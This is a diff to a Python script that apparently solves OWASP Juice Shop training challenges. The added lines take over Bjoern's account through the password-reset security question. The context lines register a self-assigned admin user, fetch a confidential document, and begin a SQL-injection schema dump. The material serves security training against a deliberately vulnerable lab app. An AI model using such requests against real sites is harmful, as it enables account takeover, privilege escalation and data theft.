@@ -7,6 +7,8 @@ import requests
 requests.post(url+'/api/Users',data={'email':'admin','password':'admin','role':'admin'})
 # ---- Admin Section (Access the administration section of the store.)
 requests.get(url+'/assets/public/images/padding/19px.png')
+# ---- Bjoern's Favorite Pet (Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.)
+requests.post(url+'/rest/user/reset-password',data={'email':'bjoern@owasp.org','answer':'Zaya','new':'bjoern','repeat':'bjoern'})
 # ---- Confidential Document (Access a confidential document.)
 requests.get(url+'/ftp/acquisitions.md')
 # ---- Database Schema (Exfiltrate the entire DB schema definition via SQL Injection.)
